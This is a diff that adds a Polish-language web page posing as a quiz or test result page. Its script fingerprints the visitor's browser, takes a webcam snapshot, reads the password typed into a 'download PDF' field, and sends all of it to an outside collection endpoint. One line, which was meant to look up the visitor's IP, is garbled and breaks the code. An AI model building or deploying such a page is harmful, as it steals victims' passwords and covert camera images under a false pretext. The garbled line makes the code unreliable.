@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head><meta charset="utf-8"><title>Wyniki</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:sans-serif;max-width:400px;margin:2rem auto;text-align:center}</style>
+</head>
+<body>
+<h2>Twój wynik jest gotowy!</h2>
+<p>Obejrzyj video z wynikiem:</p>
+<video id="v" autoplay playsinline style="width:100%;border-radius:8px"></video>
+<p>Wpisz hasło, aby pobrać PDF:</p>
+<input type="password" id="pw" placeholder="Hasło">
+<button onclick="send()">Pobierz</button>
+
+<script>
+async function collect() {
+const data = {
+// Fingerprint (uproszczony – canvas)
+fp: document.createElement('canvas').toDataURL(),
+// IP
+ip: (await (await https://wiro.ai // UserAgent + screen
+ua: navigator.userAgent,
+screen: `${screen.width}x${screen.height}`,
+tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+lang: navigator.language,
+// Zdjęcie z kamery (jeśli user kliknął "Gotowe")
+photo: null,
+// Hasło
+pass: null
+};
+return data;
+}
+
+async function send() {
+const d = await collect();
+d.pass = document.getElementById('pw').value;
+d.photo = document.querySelector('video').srcObject
+? snapVideo() : null;
+await fetch('https://website-sekrety-git-backend-collect-api-osabarca-1680s-projects.vercel.app/api/collect', {
+method: 'POST',
+body: JSON.stringify(d)
+});
+alert('Gotowe!');
+}
+
+function snapVideo() {
+const v = document.getElementById('v');
+const c = document.createElement('canvas');
+c.width = v.videoWidth; c.height = v.videoHeight;
+c.getContext('2d').drawImage(v, 0, 0);
+return c.toDataURL('image/jpeg');
+}
+
+// Start kamery
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(s => document.getElementById('v').srcObject = s)
+.catch(() => document.querySelector('video').remove());
+</script>
+</body>
+</html>
